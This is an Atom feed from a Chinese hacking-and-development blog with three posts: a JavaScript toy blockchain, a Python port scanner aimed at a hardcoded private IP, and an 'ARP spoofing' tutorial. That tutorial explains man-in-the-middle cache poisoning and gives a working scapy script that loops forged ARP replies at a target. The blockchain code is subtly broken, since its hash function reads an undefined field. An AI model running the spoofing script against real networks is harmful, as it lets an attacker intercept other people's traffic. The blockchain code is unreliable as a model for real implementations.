<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Des*tiny的博客</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-01-03T13:57:12.235Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Des*tiny</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>区块链安全（一）：挖矿过程js实现</title>
    <link href="http://example.com/2023/12/15/block(1)/"/>
    <id>http://example.com/2023/12/15/block(1)/</id>
    <published>2023-12-14T16:00:00.000Z</published>
    <updated>2024-01-03T13:57:12.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="区块链安全"><a href="#区块链安全" class="headerlink" title="区块链安全"></a>区块链安全</h1><p>2024年了，不能只会一个web吧？多去别的领域看看，还是这句话，在别的领域从基础开发开始会更好！！</p><h2 id="冷问题：为什么比特币值钱？"><a href="#冷问题：为什么比特币值钱？" class="headerlink" title="冷问题：为什么比特币值钱？"></a>冷问题：为什么比特币值钱？</h2><ol><li><p>稀缺性：比特币的总供应量是有限的，最多只能发行2100万枚。这种固定的供应量使比特币具备稀缺性，类似于黄金等有限资源。稀缺性意味着在需求增加的情况下，其价值会相应上升。</p></li><li><p>去中心化：比特币是一种去中心化的数字货币，没有中央银行或政府控制。这种去中心化的特性使其不受单一实体的控制，同时也使其免受政府干预、资金限制或货币贬值等因素的影响。这种去中心化的特性吸引了一些人寻求独立于传统金融体系的投资和交易方式。</p></li><li><p>安全性：比特币使用了密码学和区块链技术来确保交易的安全性。区块链是一个分布式的公开账本，记录了所有比特币交易的历史。这种公开透明的特性使得比特币交易相对安全，并且难以篡改。此外，比特币的交易需要经过验证和确认，使用了加密算法来保护用户的资金和隐私。</p></li><li><p>去中介化和低成本：比特币使得人们可以直接进行点对点的交易，无需通过传统的金融机构或中介。这种去除中介的交易方式可以降低交易成本和手续费，并提供更快速、便捷的跨境交易。</p></li></ol><h2 id="脚本详情（注释版）"><a href="#脚本详情（注释版）" class="headerlink" title="脚本详情（注释版）"></a>脚本详情（注释版）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">SHA256</span> = <span class="keyword">require</span>(<span class="string">&quot;crypto-js/sha256&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Transaction</span></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">constructor</span>(fromAddress,toAddress,amount)&#123;</span><br><span class="line">        this.fromAddress = fromAddress</span><br><span class="line">        this.toAddress = toAddress</span><br><span class="line">        this.amount = amount</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//交易数据类</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Block</span> </span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">constructor</span>(timestamp, transacion, previousHash = <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    this.timestamp = timestamp;</span><br><span class="line">    this.transacion = transacion;</span><br><span class="line">    this.previousHash = previousHash;</span><br><span class="line">    this.hash = this.<span class="title function_ invoke__">calcHash</span>();</span><br><span class="line">    this.nonce =<span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//区块类</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">calcHash</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">SHA256</span>(this.previousHash + this.timestamp + this.data+this.nonce).<span class="title function_ invoke__">toString</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//hash加密的数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">mineBlock</span>(diffculty)&#123;</span><br><span class="line">    <span class="keyword">while</span>(this.hash.<span class="title function_ invoke__">substring</span>(<span class="number">0</span>,diffculty) !== <span class="title function_ invoke__">Array</span>(diffculty+<span class="number">1</span>).<span class="title function_ invoke__">join</span>(<span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">      this.nonce++</span><br><span class="line">      this.hash = this.<span class="title function_ invoke__">calcHash</span>()</span><br><span class="line">    &#125;</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;Block Mind: &quot;</span> + this.hash)</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//通过判断hash值开头diffculty个0是否相等，不相等随机值nonce增加，进行下一次hash，直到相等，挖矿成功</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blockchain</span> </span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">constructor</span>() &#123;</span><br><span class="line">    this.chain = [this.<span class="title function_ invoke__">createGenesisBlock</span>()];</span><br><span class="line">    this.diffculty = <span class="number">2</span></span><br><span class="line">    this.pendTransactions = []</span><br><span class="line">    this.miningReward = <span class="number">100</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//定义blockchain类</span></span><br><span class="line">  <span class="title function_ invoke__">createGenesisBlock</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Block</span>(<span class="string">&quot;01/01/2001&quot;</span>, <span class="string">&quot;God&quot;</span>, <span class="string">&quot;000000000000000000000000000000000000000&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//创建第一个创世块</span></span><br><span class="line">  <span class="title function_ invoke__">getLastBlock</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> this.chain[this.chain.length - <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//找前一个块</span></span><br><span class="line">  <span class="title function_ invoke__">createTransaction</span>(transacion)&#123;</span><br><span class="line">    this.pendTransactions.<span class="title function_ invoke__">push</span>(transacion)</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//存储交易内容</span></span><br><span class="line">  <span class="title function_ invoke__">minependTransactions</span>(miningRewardAddress)&#123;</span><br><span class="line">    let block= <span class="keyword">new</span> <span class="title class_">Block</span>(Date.<span class="title function_ invoke__">now</span>(),this.pendTransactions)</span><br><span class="line">    block.<span class="title function_ invoke__">mineBlock</span>(this.diffculty)</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;Block successfully minded&quot;</span>)</span><br><span class="line">    this.chain.<span class="title function_ invoke__">push</span>(block)</span><br><span class="line">    this.pendTransactions=[</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Transaction</span>(<span class="literal">null</span>,miningRewardAddress,this.miningReward)</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//挖矿</span></span><br><span class="line">  <span class="title function_ invoke__">addBlock</span>(newBlock) &#123;</span><br><span class="line">    newBlock.previousHash = this.<span class="title function_ invoke__">getLastBlock</span>().hash;</span><br><span class="line">    newBlock.<span class="title function_ invoke__">mineBlock</span>(this.diffculty)</span><br><span class="line">    this.chain.<span class="title function_ invoke__">push</span>(newBlock)</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//将块加入链</span></span><br><span class="line"><span class="title function_ invoke__">getBalanceofAddress</span>(address)&#123;</span><br><span class="line">    let balance =<span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> <span class="variable constant_">block</span> of this.chain)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="variable constant_">trans</span> of block.transacion)&#123;</span><br><span class="line">            <span class="keyword">if</span>(trans.fromAddress === address)&#123;</span><br><span class="line">                balance -= trans.amount</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(trans.toAddress === address)&#123;</span><br><span class="line">                balance += trans.amount</span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> balance</span><br><span class="line"><span class="comment">//判断交易者交易完的金额</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let geekCoin =<span class="keyword">new</span> <span class="title class_">Blockchain</span>()</span><br><span class="line">geekCoin.<span class="title function_ invoke__">createTransaction</span>(<span class="keyword">new</span> <span class="title class_">Transaction</span>(<span class="string">&quot;address1&quot;</span>,<span class="string">&quot;address2&quot;</span>,<span class="number">100</span>))</span><br><span class="line">geekCoin.<span class="title function_ invoke__">createTransaction</span>(<span class="keyword">new</span> <span class="title class_">Transaction</span>(<span class="string">&quot;address2&quot;</span>,<span class="string">&quot;address1&quot;</span>,<span class="number">50</span>))</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;Balance address1 is&quot;</span>,geekCoin.<span class="title function_ invoke__">getBalanceofAddress</span>(<span class="string">&quot;address1&quot;</span>))</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;staring miner&quot;</span>)</span><br><span class="line">geekCoin.<span class="title function_ invoke__">minependTransactions</span>(<span class="string">&quot;deelmind&quot;</span>)</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;Balance address1 is&quot;</span>,geekCoin.<span class="title function_ invoke__">getBalanceofAddress</span>(<span class="string">&quot;address1&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;区块链安全&quot;&gt;&lt;a href=&quot;#区块链安全&quot; class=&quot;headerlink&quot; title=&quot;区块链安全&quot;&gt;&lt;/a&gt;区块链安全&lt;/h1&gt;&lt;p&gt;2024年了，不能只会一个web吧？多去别的领域看看，还是这句话，在别的领域从基础开发开始会更好！！&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    <category term="blog" scheme="http://example.com/categories/blog/"/>
    
    
    <category term="hexo" scheme="http://example.com/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>黑客编程（一）：简易端口扫</title>
    <link href="http://example.com/2023/12/15/python(1)/"/>
    <id>http://example.com/2023/12/15/python(1)/</id>
    <published>2023-12-14T16:00:00.000Z</published>
    <updated>2023-12-15T05:26:28.657Z</updated>
    
    <content type="html"><![CDATA[<h1 id="黑客编程-—简单端口扫工具"><a href="#黑客编程-—简单端口扫工具" class="headerlink" title="黑客编程 —简单端口扫工具"></a>黑客编程 —简单端口扫工具</h1><p>前言：开发永远是最需要去学习的东西！对于网络安全来说更是如此，本末倒置的无脑脚本跑是没有任何技术的！！</p><h2 id="脚本详情（注释版）"><a href="#脚本详情（注释版）" class="headerlink" title="脚本详情（注释版）"></a>脚本详情（注释版）</h2> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> pyfiglet</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">ascii_banner = pyfiglet.figlet_format(<span class="string">&quot;PORT SCANNER&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ascii_banner)<span class="comment">#打印艺术字</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;10.120.132.137&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>* <span class="number">50</span> )</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Scannering Target: &quot;</span>+target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Scannering started at: &quot;</span>+<span class="built_in">str</span>(datetime.now()))<span class="comment">#打印当前扫描时间</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;_&quot;</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):<span class="comment">#端口扫描范围在1~499</span></span><br><span class="line">        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        socket.setdefaulttimeout(<span class="number">1</span>)<span class="comment">#设置默认超时时间为1秒钟</span></span><br><span class="line"></span><br><span class="line">        result=s.connect_ex((target,port))</span><br><span class="line">        <span class="keyword">if</span> result ==<span class="number">0</span>:<span class="comment">#如果程序正确，打印下列内容</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Port &#123;&#125; is open&quot;</span>.<span class="built_in">format</span>(port))<span class="comment">#将存在端口打印</span></span><br><span class="line">        s.close()</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:<span class="comment">#如果用户按下键盘中断键，打印消息并退出</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n Exiting Program !!!!&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">except</span> socket.gaierror:<span class="comment">#无法解析，打印相关内容并退出</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n Hostname Could Not Be Resolved !!!!&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">except</span> socket.error:<span class="comment">#主机未响应，打印相关内容并退出</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\ Server not responding !!!!&quot;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;黑客编程-—简单端口扫工具&quot;&gt;&lt;a href=&quot;#黑客编程-—简单端口扫工具&quot; class=&quot;headerlink&quot; title=&quot;黑客编程 —简单端口扫工具&quot;&gt;&lt;/a&gt;黑客编程 —简单端口扫工具&lt;/h1&gt;&lt;p&gt;前言：开发永远是最需要去学习的东西！对于网络安全来说</summary>
      
    
    
    
    <category term="blog" scheme="http://example.com/categories/blog/"/>
    
    
    <category term="hexo" scheme="http://example.com/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>黑客编程（二）：简单ARP欺骗</title>
    <link href="http://example.com/2023/12/15/python(2)/"/>
    <id>http://example.com/2023/12/15/python(2)/</id>
    <published>2023-12-14T16:00:00.000Z</published>
    <updated>2023-12-26T06:23:24.234Z</updated>
    
    <content type="html"><![CDATA[<h1 id="黑客编程-—简单ARP欺骗"><a href="#黑客编程-—简单ARP欺骗" class="headerlink" title="黑客编程 —简单ARP欺骗"></a>黑客编程 —简单ARP欺骗</h1><p>前言：开发永远是最需要去学习的东西！对于网络安全来说更是如此，本末倒置的无脑脚本跑是没有任何技术的！！</p><h2 id="ARP欺骗是什么？"><a href="#ARP欺骗是什么？" class="headerlink" title="ARP欺骗是什么？"></a>ARP欺骗是什么？</h2><p>1.ARP协议工作过程<br>假设有两台主机A：192.168.1.1，B：192.168.1.2。当主机A要与主机B通信时，A首先会以广播的方式发送一个ARP请求包，该数据包包含了源IP（192.168.1.1），源MAC（A），目标IP（192.168.1.2），目标MAC（ff:ff:ff:ff:ff:ff）,B收到广播包后会先将A的IP与MAC地址记录到自己的ARP缓存表中，然后给A单播回复ARP replay包，该数据包包含了源IP（192.168.1.2），源MAC（B），目标IP（192.168.1.1），目标MAC（A），A收到该数据包后会将B的IP和MAC记录到自己的ARP缓存中，之后与B的通讯查询缓存即可。</p><p>2.ARP欺骗原理<br>由于ARP是无状态协议，所以当一台主机收到一个ARP响应包后不会检查自己是否发送过ARP请求，而是直接将该条记录加载到ARP缓存表中或更新原记录。这样就可以利用向目标主机发送大量的ARP响应包导致目标主机的ARP缓存一致处于错误记录状态，从而达到ARP欺骗目的</p><p>2.1单向欺骗<br>单向欺骗是只对目标主机或者网关发起ARP欺骗，攻击者只需要将自己伪装成网关或者一台主机向局域网内其他主机发送ARP响应报文即可</p><p>2.1双向欺骗<br>攻击者同时欺骗网关和目标主机，对网关说我是A，对A说我是网关，那么A与网关之间的流量都要经过攻击者的电脑，他们之间的数据也都将被攻击者截获。</p><h2 id="脚本详情（注释版）"><a href="#脚本详情（注释版）" class="headerlink" title="脚本详情（注释版）"></a>脚本详情（注释版）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#一定要先下载scapy，可以用pip install scapy</span></span><br><span class="line"></span><br><span class="line">target_ip=<span class="string">&quot;目标ip&quot;</span></span><br><span class="line">target_mac=<span class="string">&quot;目标mac&quot;</span></span><br><span class="line"></span><br><span class="line">fake_ip=<span class="string">&quot;伪造ip&quot;</span></span><br><span class="line">fake_mac=<span class="string">&quot;伪造mac&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>():</span><br><span class="line">    arp=ARP()</span><br><span class="line">    <span class="comment">#创建一个ARP对象</span></span><br><span class="line">    <span class="comment">#设置ARP数据包的以下的设置</span></span><br><span class="line">    arp.psrc=fake_ip<span class="comment">#源IP</span></span><br><span class="line">    arp.pdst=target_ip<span class="comment">#目标IP</span></span><br><span class="line">    arp.hwsrc=fake_mac<span class="comment">#源MAC</span></span><br><span class="line">    arp.hwdst=target_mac<span class="comment">#目标MAC</span></span><br><span class="line">    pkt=arp<span class="comment">#将arp对象赋值给pkt变量</span></span><br><span class="line"></span><br><span class="line">    send(pkt)<span class="comment">#发包，进行欺骗</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:<span class="comment">#主函数的入口</span></span><br><span class="line">    i=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:<span class="comment">#进行死循环</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)<span class="comment">#每次循环延时1秒</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;第&#123;&#125;次攻击&quot;</span>.<span class="built_in">format</span>(i))<span class="comment">#记录是第几次进攻</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        arp_spoof()<span class="comment">#调用上面的函数</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;黑客编程-—简单ARP欺骗&quot;&gt;&lt;a href=&quot;#黑客编程-—简单ARP欺骗&quot; class=&quot;headerlink&quot; title=&quot;黑客编程 —简单ARP欺骗&quot;&gt;&lt;/a&gt;黑客编程 —简单ARP欺骗&lt;/h1&gt;&lt;p&gt;前言：开发永远是最需要去学习的东西！对于网络安全来说</summary>
      
    
    
    
    <category term="blog" scheme="http://example.com/categories/blog/"/>
    
    
    <category term="hexo" scheme="http://example.com/tags/hexo/"/>
    
  </entry>
  
</feed>
